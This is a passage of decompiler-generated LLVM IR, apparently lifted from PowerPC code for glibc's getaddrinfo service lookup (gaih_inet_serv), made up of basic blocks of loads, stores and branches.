  %v3_1001c904 = icmp eq i32 %v3_1001c900, 0
  br i1 %v3_1001c904, label %dec_label_pc_1001c97c, label %dec_label_pc_1001c8f4

dec_label_pc_1001c910:                            ; preds = %dec_label_pc_1001c950, %dec_label_pc_1001c930
  %v1_1001c910 = add i32 %v0_1001c910, 7
  br label %dec_label_pc_1001c914

dec_label_pc_1001c914:                            ; preds = %dec_label_pc_1001c8f4, %dec_label_pc_1001c910
  %v0_1001c910 = phi i32 [ ptrtoint (i8** @global_var_1002f02b.1187 to i32), %dec_label_pc_1001c8f4 ], [ %v1_1001c910, %dec_label_pc_1001c910 ]
  store i32 %v0_1001c910, i32* @r4, align 4
  %v1_1001c914 = add i32 %v0_1001c910, 3
  %v2_1001c914 = inttoptr i32 %v1_1001c914 to i8*
  %v3_1001c914 = load i8, i8* %v2_1001c914, align 1
  %v4_1001c914 = zext i8 %v3_1001c914 to i32
  store i32 %v4_1001c914, i32* @r10, align 4
  %v3_1001c91c = icmp eq i8 %v3_1001c914, 0
  %v3_1001c968 = load i32, i32* %v2_1001c900, align 4
  br i1 %v3_1001c91c, label %dec_label_pc_1001c968, label %dec_label_pc_1001c924

dec_label_pc_1001c924:                            ; preds = %dec_label_pc_1001c914
  store i32 %v3_1001c968, i32* %r9.global-to-local, align 4
  %v3_1001c928 = icmp eq i32 %v3_1001c968, 0
  br i1 %v3_1001c928, label %dec_label_pc_1001c940, label %dec_label_pc_1001c930

dec_label_pc_1001c930:                            ; preds = %dec_label_pc_1001c924
  %v1_1001c930 = inttoptr i32 %v0_1001c910 to i8*
  %v2_1001c930 = load i8, i8* %v1_1001c930, align 1
  %v2_1001c934 = sext i8 %v2_1001c930 to i32
  store i32 %v2_1001c934, i32* %r0.global-to-local, align 4
  %v4_1001c938 = icmp eq i32 %v3_1001c968, %v2_1001c934
  br i1 %v4_1001c938, label %dec_label_pc_1001c940, label %dec_label_pc_1001c910

dec_label_pc_1001c940:                            ; preds = %dec_label_pc_1001c930, %dec_label_pc_1001c924
  br i1 %v3_1001c8ec, label %dec_label_pc_1001c960.thread, label %dec_label_pc_1001c944

dec_label_pc_1001c944:                            ; preds = %dec_label_pc_1001c940
  %v1_1001c944 = add i32 %v0_1001c910, 2
  %v2_1001c944 = inttoptr i32 %v1_1001c944 to i8*
  %v3_1001c944 = load i8, i8* %v2_1001c944, align 1
  %v4_1001c944 = zext i8 %v3_1001c944 to i32
  store i32 %v4_1001c944, i32* %r0.global-to-local, align 4
  %v1_1001c948 = and i32 %v4_1001c944, 2
  store i32 %v1_1001c948, i32* %r9.global-to-local, align 4
  %v3_1001c948 = icmp eq i32 %v1_1001c948, 0
  br i1 %v3_1001c948, label %dec_label_pc_1001c950, label %dec_label_pc_1001c960.thread

dec_label_pc_1001c950:                            ; preds = %dec_label_pc_1001c944
  %v1_1001c950 = add i32 %v0_1001c910, 1
  %v2_1001c950 = inttoptr i32 %v1_1001c950 to i8*
  %v3_1001c950 = load i8, i8* %v2_1001c950, align 1
  %v2_1001c954 = sext i8 %v3_1001c950 to i32
  store i32 %v2_1001c954, i32* %r0.global-to-local, align 4
  %v4_1001c958 = icmp eq i32 %v3_1001c8e8, %v2_1001c954
  br i1 %v4_1001c958, label %dec_label_pc_1001c960.thread, label %dec_label_pc_1001c910

dec_label_pc_1001c960.thread:                     ; preds = %dec_label_pc_1001c950, %dec_label_pc_1001c944, %dec_label_pc_1001c940
  br label %dec_label_pc_1001c984

dec_label_pc_1001c968:                            ; preds = %dec_label_pc_1001c914
  store i32 %v3_1001c968, i32* %r0.global-to-local, align 4
  store i32 263, i32* %r9.global-to-local, align 4
  %v3_1001c970 = icmp eq i32 %v3_1001c968, 0
  br i1 %v3_1001c970, label %dec_label_pc_1001d3b4, label %dec_label_pc_1001d3f0

dec_label_pc_1001c97c:                            ; preds = %dec_label_pc_1001c900
  store i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32), i32* %r9.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1002f024.1188 to i32), i32* @r4, align 4
  br label %dec_label_pc_1001c984

dec_label_pc_1001c984:                            ; preds = %dec_label_pc_1001c960.thread, %dec_label_pc_1001c97c
  %v0_1001cb5c = phi i32 [ ptrtoint (i32* @global_var_1002f024.1188 to i32), %dec_label_pc_1001c97c ], [ %v0_1001c910, %dec_label_pc_1001c960.thread ]
  %v0_1001c984 = load i32, i32* @r28, align 4
  %v3_1001c984 = icmp eq i32 %v0_1001c984, 0
  br i1 %v3_1001c984, label %dec_label_pc_1001caec, label %dec_label_pc_1001c98c

dec_label_pc_1001c98c:                            ; preds = %dec_label_pc_1001c984
  %v1_1001c98c = add i32 %v0_1001cb5c, 2
  %v2_1001c98c = inttoptr i32 %v1_1001c98c to i8*
  %v3_1001c98c = load i8, i8* %v2_1001c98c, align 1
  %v4_1001c98c = zext i8 %v3_1001c98c to i32
  store i32 %v4_1001c98c, i32* %r0.global-to-local, align 4
  %tmp113 = urem i8 %v3_1001c98c, 2
  %v1_1001c990 = zext i8 %tmp113 to i32
  store i32 %v1_1001c990, i32* @r10, align 4
  %v3_1001c990 = icmp eq i8 %tmp113, 0
  br i1 %v3_1001c990, label %dec_label_pc_1001c998, label %dec_label_pc_1001d3b4

dec_label_pc_1001c998:                            ; preds = %dec_label_pc_1001c98c
  %v1_1001c998 = add i32 %v0_1001c984, 4
  %v2_1001c998 = inttoptr i32 %v1_1001c998 to i32*
  %v3_1001c998 = load i32, i32* %v2_1001c998, align 4
  store i32 %v3_1001c998, i32* %r0.global-to-local, align 4
  %tmp81 = icmp sgt i32 %v3_1001c998, -1
  br i1 %tmp81, label %dec_label_pc_1001ca98, label %dec_label_pc_1001c9a4

dec_label_pc_1001c9a4:                            ; preds = %dec_label_pc_1001c998
  %v1_1001c9a4 = add i32 %v0_1001cb5c, 3
  %v2_1001c9a4 = inttoptr i32 %v1_1001c9a4 to i8*
  %v3_1001c9a4 = load i8, i8* %v2_1001c9a4, align 1
  %v4_1001c9a4 = zext i8 %v3_1001c9a4 to i32
  store i32 %v4_1001c9a4, i32* %r0.global-to-local, align 4
  %v1_1001c9a8 = add i32 %v0_1001cb5c, 7
  store i32 %v1_1001c9a8, i32* @r30, align 4
  %v2_1001c9ac = ptrtoint i32* %stack_var_-168 to i32
  store i32 %v2_1001c9ac, i32* %r26.global-to-local, align 4
  %v3_1001c9b0 = icmp eq i8 %v3_1001c9a4, 0
  br i1 %v3_1001c9b0, label %dec_label_pc_1001ca78.preheader, label %dec_label_pc_1001c9b8

dec_label_pc_1001ca78.preheader:                  ; preds = %dec_label_pc_1001c9a4
  %v1_1001ca7823 = add i32 %v0_1001cb5c, 10
  %v2_1001ca7824 = inttoptr i32 %v1_1001ca7823 to i8*
  %v3_1001ca7825 = load i8, i8* %v2_1001ca7824, align 1
  %v4_1001ca7826 = zext i8 %v3_1001ca7825 to i32
  store i32 %v4_1001ca7826, i32* %r0.global-to-local, align 4
  %v3_1001ca7c28 = icmp eq i8 %v3_1001ca7825, 0
  br i1 %v3_1001ca7c28, label %dec_label_pc_1001ca84, label %dec_label_pc_1001c9e8.lr.ph

dec_label_pc_1001c9e8.lr.ph:                      ; preds = %dec_label_pc_1001ca78.preheader
  %v2_1001ca48 = ptrtoint i32* %stack_var_-185 to i32
  br label %dec_label_pc_1001c9e8

dec_label_pc_1001c9b8:                            ; preds = %dec_label_pc_1001c9a4
  %v2_1001c9b8 = load i32, i32* %stack_var_-176, align 4
  store i32 %v2_1001c9b8, i32* %r0.global-to-local, align 4
  store i32 %v0_1001c8e8, i32* @r5, align 4
  store i32 %v2_1001c9b8, i32* %stack_var_-208, align 4
  %v2_1001c9c8 = ptrtoint i32* %stack_var_-185 to i32
  store i32 %v2_1001c9c8, i32* %r0.global-to-local, align 4
  %v1_1001c9cc = call i32 @__asm_rlwinm(i32 %v2_1001c9c8, i32 0, i32 0, i32 27)
  store i32 %v1_1001c9cc, i32* %r0.global-to-local, align 4
  store i32 %v1_1001c9cc, i32* @r6, align 4
  store i32 %v1_1001c9cc, i32* %stack_var_-168, align 4
  store i32 268552668, i32* @lr, align 4
  %v1_1001c9d8 = call i32 @gaih_inet_serv(i32 %v1_1001c9cc)
  store i32 %v1_1001c9d8, i32* %r9.global-to-local, align 4
  %v3_1001c9dc = icmp eq i32 %v1_1001c9d8, 0
  br i1 %v3_1001c9dc, label %dec_label_pc_1001cbb4, label %dec_label_pc_1001d3f0

dec_label_pc_1001c9e8:                            ; preds = %dec_label_pc_1001c9e8.lr.ph, %dec_label_pc_1001ca74
  %v0_1001ca38 = phi i32 [ %v1_1001c9a8, %dec_label_pc_1001c9e8.lr.ph ], [ %v1_1001ca74, %dec_label_pc_1001ca74 ]
  %v1_1001c9e8 = add i32 %v0_1001ca38, 2
  %v2_1001c9e8 = inttoptr i32 %v1_1001c9e8 to i8*
  %v3_1001c9e8 = load i8, i8* %v2_1001c9e8, align 1
  %v4_1001c9e8 = zext i8 %v3_1001c9e8 to i32
  store i32 %v4_1001c9e8, i32* %r11.global-to-local, align 4
  %tmp114 = urem i8 %v3_1001c9e8, 2
  %v1_1001c9ec = zext i8 %tmp114 to i32
  store i32 %v1_1001c9ec, i32* %r0.global-to-local, align 4
  %v3_1001c9ec = icmp eq i8 %tmp114, 0
  br i1 %v3_1001c9ec, label %dec_label_pc_1001c9f4, label %dec_label_pc_1001ca74

dec_label_pc_1001c9f4:                            ; preds = %dec_label_pc_1001c9e8
  %v0_1001c9f4 = load i32, i32* @r27, align 4
  %v1_1001c9f4 = add i32 %v0_1001c9f4, 8
  %v2_1001c9f4 = inttoptr i32 %v1_1001c9f4 to i32*
  %v3_1001c9f4 = load i32, i32* %v2_1001c9f4, align 4
  store i32 %v3_1001c9f4, i32* %r9.global-to-local, align 4
  %v3_1001c9f8 = icmp eq i32 %v3_1001c9f4, 0
  br i1 %v3_1001c9f8, label %dec_label_pc_1001ca10, label %dec_label_pc_1001ca00

dec_label_pc_1001ca00:                            ; preds = %dec_label_pc_1001c9f4
  %v1_1001ca00 = inttoptr i32 %v0_1001ca38 to i8*
  %v2_1001ca00 = load i8, i8* %v1_1001ca00, align 1
  %v2_1001ca04 = sext i8 %v2_1001ca00 to i32
  store i32 %v2_1001ca04, i32* %r0.global-to-local, align 4
  %v4_1001ca08 = icmp eq i32 %v3_1001c9f4, %v2_1001ca04
  br i1 %v4_1001ca08, label %dec_label_pc_1001ca10, label %dec_label_pc_1001ca74

dec_label_pc_1001ca10:                            ; preds = %dec_label_pc_1001ca00, %dec_label_pc_1001c9f4
  %v1_1001ca10 = add i32 %v0_1001c9f4, 12
  %v2_1001ca10 = inttoptr i32 %v1_1001ca10 to i32*
  %v3_1001ca10 = load i32, i32* %v2_1001ca10, align 4
  store i32 %v3_1001ca10, i32* %r9.global-to-local, align 4
  %v3_1001ca14 = icmp eq i32 %v3_1001ca10, 0
  br i1 %v3_1001ca14, label %dec_label_pc_1001ca34, label %dec_label_pc_1001ca1c

dec_label_pc_1001ca1c:                            ; preds = %dec_label_pc_1001ca10
  %v1_1001ca1c = and i32 %v4_1001c9e8, 2
  store i32 %v1_1001ca1c, i32* %r0.global-to-local, align 4
  %v3_1001ca1c = icmp eq i32 %v1_1001ca1c, 0
  br i1 %v3_1001ca1c, label %dec_label_pc_1001ca24, label %dec_label_pc_1001ca34

dec_label_pc_1001ca24:                            ; preds = %dec_label_pc_1001ca1c
  %v1_1001ca24 = add i32 %v0_1001ca38, 1
  %v2_1001ca24 = inttoptr i32 %v1_1001ca24 to i8*
  %v3_1001ca24 = load i8, i8* %v2_1001ca24, align 1
  %v2_1001ca28 = sext i8 %v3_1001ca24 to i32
  store i32 %v2_1001ca28, i32* %r0.global-to-local, align 4
  %v4_1001ca2c = icmp eq i32 %v3_1001ca10, %v2_1001ca28
  br i1 %v4_1001ca2c, label %dec_label_pc_1001ca34, label %dec_label_pc_1001ca74

dec_label_pc_1001ca34:                            ; preds = %dec_label_pc_1001ca24, %dec_label_pc_1001ca1c, %dec_label_pc_1001ca10
  %v2_1001ca34 = load i32, i32* %stack_var_-176, align 4
  store i32 %v2_1001ca34, i32* %r0.global-to-local, align 4
  store i32 %v0_1001ca38, i32* @r4, align 4
  store i32 %v0_1001c9f4, i32* @r5, align 4
  store i32 %v2_1001ca34, i32* %stack_var_-208, align 4
  store i32 %v2_1001ca48, i32* %r0.global-to-local, align 4
  %v1_1001ca4c = call i32 @__asm_rlwinm(i32 %v2_1001ca48, i32 0, i32 0, i32 27)
  store i32 %v1_1001ca4c, i32* %r29.global-to-local, align 4
  store i32 %v1_1001ca4c, i32* @r6, align 4
  store i32 268552792, i32* @lr, align 4
  %v1_1001ca54 = call i32 @gaih_inet_serv(i32 %v1_1001ca4c)
  store i32 %v1_1001ca54, i32* %r9.global-to-local, align 4
  %v3_1001ca58 = icmp eq i32 %v1_1001ca54, 0
  br i1 %v3_1001ca58, label %dec_label_pc_1001ca6c, label %dec_label_pc_1001ca60

dec_label_pc_1001ca60:                            ; preds = %dec_label_pc_1001ca34
  %v1_1001ca60 = and i32 %v1_1001ca54, 256
  store i32 %v1_1001ca60, i32* %r0.global-to-local, align 4
  %v3_1001ca60 = icmp eq i32 %v1_1001ca60, 0
  br i1 %v3_1001ca60, label %dec_label_pc_1001d3f0, label %dec_label_pc_1001ca74

dec_label_pc_1001ca6c:                            ; preds = %dec_label_pc_1001ca34
  %v1_1001ca6c = load i32, i32* @r26, align 4
  %v2_1001ca6c = inttoptr i32 %v1_1001ca6c to i32*
  store i32 %v1_1001ca4c, i32* %v2_1001ca6c, align 4
  store i32 %v1_1001ca4c, i32* %r26.global-to-local, align 4
  br label %dec_label_pc_1001ca74

dec_label_pc_1001ca74:                            ; preds = %dec_label_pc_1001ca60, %dec_label_pc_1001ca24, %dec_label_pc_1001ca00, %dec_label_pc_1001c9e8, %dec_label_pc_1001ca6c
  %v0_1001ca74 = load i32, i32* @r30, align 4
  %v1_1001ca74 = add i32 %v0_1001ca74, 7
  store i32 %v1_1001ca74, i32* @r30, align 4
  %v1_1001ca78 = add i32 %v0_1001ca74, 10
  %v2_1001ca78 = inttoptr i32 %v1_1001ca78 to i8*
  %v3_1001ca78 = load i8, i8* %v2_1001ca78, align 1
  %v4_1001ca78 = zext i8 %v3_1001ca78 to i32
  store i32 %v4_1001ca78, i32* %r0.global-to-local, align 4
  %v3_1001ca7c = icmp eq i8 %v3_1001ca78, 0
  br i1 %v3_1001ca7c, label %dec_label_pc_1001ca84, label %dec_label_pc_1001c9e8

dec_label_pc_1001ca84:                            ; preds = %dec_label_pc_1001ca74, %dec_label_pc_1001ca78.preheader
  %v3_1001ca84 = load i32, i32* %stack_var_-168, align 4
  store i32 %v3_1001ca84, i32* %r0.global-to-local, align 4
  store i32 %v2_1001c898, i32* %r9.global-to-local, align 4
  %v4_1001ca8c = icmp eq i32 %v3_1001ca84, %v2_1001c898
  br i1 %v4_1001ca8c, label %dec_label_pc_1001d3b4, label %dec_label_pc_1001cbb4

dec_label_pc_1001ca98:                            ; preds = %dec_label_pc_1001c998
  %v2_1001ca98 = load i32, i32* %stack_var_-176, align 4
  store i32 %v2_1001ca98, i32* %r0.global-to-local, align 4
  %v1_1001ca9c = inttoptr i32 %v0_1001cb5c to i8*
  %v2_1001ca9c = load i8, i8* %v1_1001ca9c, align 1
  store i32 %v2_1001ca98, i32* %stack_var_-208, align 4
  %v2_1001caa4 = sext i8 %v2_1001ca9c to i32
  store i32 %v2_1001caa4, i32* %r11.global-to-local, align 4
  %v2_1001caa8 = ptrtoint i32* %stack_var_-185 to i32
  store i32 %v2_1001caa8, i32* %r9.global-to-local, align 4
  %v1_1001caac = call i32 @__asm_rlwinm(i32 %v2_1001caa8, i32 0, i32 0, i32 27)
  store i32 %v1_1001caac, i32* %stack_var_-168, align 4
  %v0_1001cab4 = load i32, i32* @r10, align 4
  %v2_1001cab4 = inttoptr i32 %v1_1001caac to i32*
  store i32 %v0_1001cab4, i32* %v2_1001cab4, align 4
  %v3_1001cab8 = load i32, i32* %stack_var_-168, align 4
  store i32 %v3_1001cab8, i32* %r9.global-to-local, align 4
  %v0_1001cabc = load i32, i32* %r11.global-to-local, align 4
  %v2_1001cabc = add i32 %v3_1001cab8, 4
  %v3_1001cabc = inttoptr i32 %v2_1001cabc to i32*
  store i32 %v0_1001cabc, i32* %v3_1001cabc, align 4
  %v0_1001cac0 = load i32, i32* @r4, align 4
  %v1_1001cac0 = add i32 %v0_1001cac0, 2
  %v2_1001cac0 = inttoptr i32 %v1_1001cac0 to i8*
  %v3_1001cac0 = load i8, i8* %v2_1001cac0, align 1
  %v4_1001cac0 = zext i8 %v3_1001cac0 to i32
  store i32 %v4_1001cac0, i32* %r0.global-to-local, align 4
  %v3_1001cac4 = load i32, i32* %stack_var_-168, align 4
  store i32 %v3_1001cac4, i32* %r9.global-to-local, align 4
  %v1_1001cac8 = and i32 %v4_1001cac0, 2
  store i32 %v1_1001cac8, i32* %r11.global-to-local, align 4
  %v3_1001cac8 = icmp eq i32 %v1_1001cac8, 0
  br i1 %v3_1001cac8, label %dec_label_pc_1001cad8, label %dec_label_pc_1001cad0

dec_label_pc_1001cad0:                            ; preds = %dec_label_pc_1001ca98
  %v0_1001cad0 = load i32, i32* @r27, align 4
  %v1_1001cad0 = add i32 %v0_1001cad0, 12
  %v2_1001cad0 = inttoptr i32 %v1_1001cad0 to i32*
  %v3_1001cad0 = load i32, i32* %v2_1001cad0, align 4
  br label %dec_label_pc_1001cae0

dec_label_pc_1001cad8:                            ; preds = %dec_label_pc_1001ca98
  %v1_1001cad8 = add i32 %v0_1001cac0, 1
  %v2_1001cad8 = inttoptr i32 %v1_1001cad8 to i8*
  %v3_1001cad8 = load i8, i8* %v2_1001cad8, align 1
  %v4_1001cad8 = zext i8 %v3_1001cad8 to i32
  store i32 %v4_1001cad8, i32* %r0.global-to-local, align 4
  %v2_1001cadc = sext i8 %v3_1001cad8 to i32
  br label %dec_label_pc_1001cae0

dec_label_pc_1001cae0:                            ; preds = %dec_label_pc_1001cad0, %dec_label_pc_1001cad8
  %storemerge4 = phi i32 [ %v3_1001cad0, %dec_label_pc_1001cad0 ], [ %v2_1001cadc, %dec_label_pc_1001cad8 ]
  store i32 %storemerge4, i32* %r0.global-to-local, align 4
  %v2_1001cae0 = add i32 %v3_1001cac4, 8
  %v3_1001cae0 = inttoptr i32 %v2_1001cae0 to i32*
  store i32 %storemerge4, i32* %v3_1001cae0, align 4
  %v0_1001cae4 = load i32, i32* @r28, align 4
  %v1_1001cae4 = add i32 %v0_1001cae4, 4
  %v2_1001cae4 = inttoptr i32 %v1_1001cae4 to i32*
  %v3_1001cae4 = load i32, i32* %v2_1001cae4, align 4
  br label %dec_label_pc_1001cb50

dec_label_pc_1001caec:                            ; preds = %dec_label_pc_1001c984
  %v1_1001caec = add i32 %v0_1001c8e8, 8
  %v2_1001caec = inttoptr i32 %v1_1001caec to i32*
  %v3_1001caec = load i32, i32* %v2_1001caec, align 4
  store i32 %v3_1001caec, i32* %r0.global-to-local, align 4
  %v3_1001caf0 = icmp eq i32 %v3_1001caec, 0
  br i1 %v3_1001caf0, label %dec_label_pc_1001caf8, label %dec_label_pc_1001cb00

dec_label_pc_1001caf8:                            ; preds = %dec_label_pc_1001caec
  br i1 %v3_1001c8ec, label %dec_label_pc_1001cb5c, label %dec_label_pc_1001cb00

dec_label_pc_1001cb00:                            ; preds = %dec_label_pc_1001caec, %dec_label_pc_1001caf8
  %v2_1001cb00 = load i32, i32* %stack_var_-176, align 4
  store i32 %v2_1001cb00, i32* %r0.global-to-local, align 4
  %v1_1001cb04 = inttoptr i32 %v0_1001cb5c to i8*
  %v2_1001cb04 = load i8, i8* %v1_1001cb04, align 1
  store i32 %v2_1001cb00, i32* %stack_var_-208, align 4
  %v2_1001cb0c = sext i8 %v2_1001cb04 to i32
  store i32 %v2_1001cb0c, i32* %r11.global-to-local, align 4
  %v2_1001cb10 = ptrtoint i32* %stack_var_-185 to i32
  store i32 %v2_1001cb10, i32* %r9.global-to-local, align 4
  %v1_1001cb14 = call i32 @__asm_rlwinm(i32 %v2_1001cb10, i32 0, i32 0, i32 27)
  store i32 %v1_1001cb14, i32* %stack_var_-168, align 4
  %v0_1001cb1c = load i32, i32* @r28, align 4
  %v2_1001cb1c = inttoptr i32 %v1_1001cb14 to i32*
  store i32 %v0_1001cb1c, i32* %v2_1001cb1c, align 4
  %v3_1001cb20 = load i32, i32* %stack_var_-168, align 4
  store i32 %v3_1001cb20, i32* %r9.global-to-local, align 4
  %v0_1001cb24 = load i32, i32* %r11.global-to-local, align 4
  %v2_1001cb24 = add i32 %v3_1001cb20, 4
  %v3_1001cb24 = inttoptr i32 %v2_1001cb24 to i32*
  store i32 %v0_1001cb24, i32* %v3_1001cb24, align 4
  %v0_1001cb28 = load i32, i32* @r4, align 4
  %v1_1001cb28 = add i32 %v0_1001cb28, 2
  %v2_1001cb28 = inttoptr i32 %v1_1001cb28 to i8*
  %v3_1001cb28 = load i8, i8* %v2_1001cb28, align 1
  %v4_1001cb28 = zext i8 %v3_1001cb28 to i32
  store i32 %v4_1001cb28, i32* %r0.global-to-local, align 4
  %v3_1001cb2c = load i32, i32* %stack_var_-168, align 4
  store i32 %v3_1001cb2c, i32* %r9.global-to-local, align 4
  %v1_1001cb30 = and i32 %v4_1001cb28, 2
  store i32 %v1_1001cb30, i32* %r11.global-to-local, align 4
  %v3_1001cb30 = icmp eq i32 %v1_1001cb30, 0
  br i1 %v3_1001cb30, label %dec_label_pc_1001cb40, label %dec_label_pc_1001cb38

dec_label_pc_1001cb38:                            ; preds = %dec_label_pc_1001cb00
  %v0_1001cb38 = load i32, i32* @r27, align 4
  %v1_1001cb38 = add i32 %v0_1001cb38, 12
  %v2_1001cb38 = inttoptr i32 %v1_1001cb38 to i32*
  %v3_1001cb38 = load i32, i32* %v2_1001cb38, align 4
  br label %dec_label_pc_1001cb48

dec_label_pc_1001cb40:                            ; preds = %dec_label_pc_1001cb00
  %v1_1001cb40 = add i32 %v0_1001cb28, 1
  %v2_1001cb40 = inttoptr i32 %v1_1001cb40 to i8*
  %v3_1001cb40 = load i8, i8* %v2_1001cb40, align 1
  %v4_1001cb40 = zext i8 %v3_1001cb40 to i32
  store i32 %v4_1001cb40, i32* %r0.global-to-local, align 4
  %v2_1001cb44 = sext i8 %v3_1001cb40 to i32
  br label %dec_label_pc_1001cb48

dec_label_pc_1001cb48:                            ; preds = %dec_label_pc_1001cb38, %dec_label_pc_1001cb40
  %storemerge6 = phi i32 [ %v3_1001cb38, %dec_label_pc_1001cb38 ], [ %v2_1001cb44, %dec_label_pc_1001cb40 ]
  store i32 %storemerge6, i32* %r0.global-to-local, align 4
  %v2_1001cb48 = add i32 %v3_1001cb2c, 8
  %v3_1001cb48 = inttoptr i32 %v2_1001cb48 to i32*
  store i32 %storemerge6, i32* %v3_1001cb48, align 4
  br label %dec_label_pc_1001cb50

dec_label_pc_1001cb50:                            ; preds = %dec_label_pc_1001cae0, %dec_label_pc_1001cb48
  %storemerge5 = phi i32 [ %v3_1001cae4, %dec_label_pc_1001cae0 ], [ 0, %dec_label_pc_1001cb48 ]
  store i32 %storemerge5, i32* %r0.global-to-local, align 4
  %v3_1001cb50 = load i32, i32* %stack_var_-168, align 4
  store i32 %v3_1001cb50, i32* %r9.global-to-local, align 4
  %v2_1001cb54 = add i32 %v3_1001cb50, 12
  %v3_1001cb54 = inttoptr i32 %v2_1001cb54 to i32*
  store i32 %storemerge5, i32* %v3_1001cb54, align 4
  br label %dec_label_pc_1001cbb4

dec_label_pc_1001cb5c:                            ; preds = %dec_label_pc_1001caf8
  %v1_1001cb5c = add i32 %v0_1001cb5c, 7
  store i32 %v1_1001cb5c, i32* %r4.global-to-local, align 4
  %v2_1001cb60 = ptrtoint i32* %stack_var_-168 to i32
  store i32 %v2_1001cb60, i32* @r8, align 4
  store i32 0, i32* @r10, align 4
  %v1_1001cba816 = add i32 %v0_1001cb5c, 10
  %v2_1001cba817 = inttoptr i32 %v1_1001cba816 to i8*
  %v3_1001cba818 = load i8, i8* %v2_1001cba817, align 1
  %v4_1001cba819 = zext i8 %v3_1001cba818 to i32
  store i32 %v4_1001cba819, i32* %r0.global-to-local, align 4
  %v3_1001cbac21 = icmp eq i8 %v3_1001cba818, 0
  br i1 %v3_1001cbac21, label %dec_label_pc_1001cbb4, label %dec_label_pc_1001cb6c.lr.ph

dec_label_pc_1001cb6c.lr.ph:                      ; preds = %dec_label_pc_1001cb5c
  %v2_1001cb88 = ptrtoint i32* %stack_var_-185 to i32
  br label %dec_label_pc_1001cb6c

dec_label_pc_1001cb6c:                            ; preds = %dec_label_pc_1001cb6c.lr.ph, %dec_label_pc_1001cb6c
  %v0_1001cb78 = phi i32 [ %v1_1001cb5c, %dec_label_pc_1001cb6c.lr.ph ], [ %v0_1001cba8, %dec_label_pc_1001cb6c ]
  %v2_1001cb6c = load i32, i32* %stack_var_-208, align 4
  store i32 %v2_1001cb6c, i32* %r9.global-to-local, align 4
  %v1_1001cb70 = inttoptr i32 %v0_1001cb78 to i8*
  %v2_1001cb70 = load i8, i8* %v1_1001cb70, align 1
  %v3_1001cb70 = zext i8 %v2_1001cb70 to i32
  store i32 %v3_1001cb70, i32* %r0.global-to-local, align 4
  %v1_1001cb74 = add i32 %v0_1001cb78, 1
  %v2_1001cb74 = inttoptr i32 %v1_1001cb74 to i8*
  %v3_1001cb74 = load i8, i8* %v2_1001cb74, align 1
  %v1_1001cb78 = add i32 %v0_1001cb78, 7
  store i32 %v1_1001cb78, i32* %r4.global-to-local, align 4
  %v2_1001cb80 = sext i8 %v2_1001cb70 to i32
  store i32 %v2_1001cb80, i32* %r0.global-to-local, align 4
  %v2_1001cb84 = sext i8 %v3_1001cb74 to i32
  store i32 %v2_1001cb84, i32* %r11.global-to-local, align 4
  store i32 %v2_1001cb88, i32* %r9.global-to-local, align 4
  %v1_1001cb8c = call i32 @__asm_rlwinm(i32 %v2_1001cb88, i32 0, i32 0, i32 27)
  store i32 %v1_1001cb8c, i32* %r9.global-to-local, align 4
  %v0_1001cb90 = load i32, i32* %r0.global-to-local, align 4
  %v2_1001cb90 = add i32 %v1_1001cb8c, 4
  %v3_1001cb90 = inttoptr i32 %v2_1001cb90 to i32*
  store i32 %v0_1001cb90, i32* %v3_1001cb90, align 4
  %v0_1001cb94 = load i32, i32* %r11.global-to-local, align 4
  %v2_1001cb94 = add i32 %v1_1001cb8c, 8
  %v3_1001cb94 = inttoptr i32 %v2_1001cb94 to i32*
  store i32 %v0_1001cb94, i32* %v3_1001cb94, align 4
  %v0_1001cb98 = load i32, i32* @r10, align 4
  %v2_1001cb98 = inttoptr i32 %v1_1001cb8c to i32*
  store i32 %v0_1001cb98, i32* %v2_1001cb98, align 4
  %v0_1001cb9c = load i32, i32* @r10, align 4
  %v2_1001cb9c = add i32 %v1_1001cb8c, 12
  %v3_1001cb9c = inttoptr i32 %v2_1001cb9c to i32*
  store i32 %v0_1001cb9c, i32* %v3_1001cb9c, align 4
  %v1_1001cba0 = load i32, i32* @r8, align 4
  %v2_1001cba0 = inttoptr i32 %v1_1001cba0 to i32*
  store i32 %v1_1001cb8c, i32* %v2_1001cba0, align 4
  store i32 %v1_1001cb8c, i32* @r8, align 4
  %v0_1001cba8 = load i32, i32* %r4.global-to-local, align 4
  %v1_1001cba8 = add i32 %v0_1001cba8, 3
  %v2_1001cba8 = inttoptr i32 %v1_1001cba8 to i8*
  %v3_1001cba8 = load i8, i8* %v2_1001cba8, align 1
  %v4_1001cba8 = zext i8 %v3_1001cba8 to i32
  store i32 %v4_1001cba8, i32* %r0.global-to-local, align 4
  %v3_1001cbac = icmp eq i8 %v3_1001cba8, 0
  br i1 %v3_1001cbac, label %dec_label_pc_1001cbb4, label %dec_label_pc_1001cb6c

dec_label_pc_1001cbb4:                            ; preds = %dec_label_pc_1001cb6c, %dec_label_pc_1001cb5c, %dec_label_pc_1001ca84, %dec_label_pc_1001c9b8, %dec_label_pc_1001cb50
  %v0_1001cbb4 = load i32, i32* @r24, align 4
  %v3_1001cbb4 = icmp eq i32 %v0_1001cbb4, 0
  %v2_1001cbb8 = load i32, i32* %stack_var_-208, align 4
  store i32 %v2_1001cbb8, i32* %r0.global-to-local, align 4
  store i32 %v2_1001cbb8, i32* %stack_var_-256, align 4
  br i1 %v3_1001cbb4, label %dec_label_pc_1001d064, label %dec_label_pc_1001cbc0

dec_label_pc_1001cbc0:                            ; preds = %dec_label_pc_1001cbb4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v0_1001cbb4, i32* @r4, align 4
  %v2_1001cbd0 = ptrtoint i32* %stack_var_-233 to i32
  store i32 %v2_1001cbd0, i32* %r9.global-to-local, align 4
  %v1_1001cbd4 = call i32 @__asm_rlwinm(i32 %v2_1001cbd0, i32 0, i32 0, i32 27)
  store i32 %v1_1001cbd4, i32* %stack_var_-164, align 4
  %v0_1001cbdc = load i32, i32* %r0.global-to-local, align 4
  %v2_1001cbdc = add i32 %v1_1001cbd4, 4
  %v3_1001cbdc = inttoptr i32 %v2_1001cbdc to i32*
  store i32 %v0_1001cbdc, i32* %v3_1001cbdc, align 4
  %v3_1001cbe0 = load i32, i32* %stack_var_-164, align 4
  %v0_1001cbe4 = load i32, i32* %r0.global-to-local, align 4
  %v2_1001cbe4 = add i32 %v3_1001cbe0, 24
  %v3_1001cbe4 = inttoptr i32 %v2_1001cbe4 to i32*
  store i32 %v0_1001cbe4, i32* %v3_1001cbe4, align 4
  %v3_1001cbe8 = load i32, i32* %stack_var_-164, align 4
  store i32 %v3_1001cbe8, i32* %r9.global-to-local, align 4
  %v0_1001cbec = load i32, i32* %r0.global-to-local, align 4
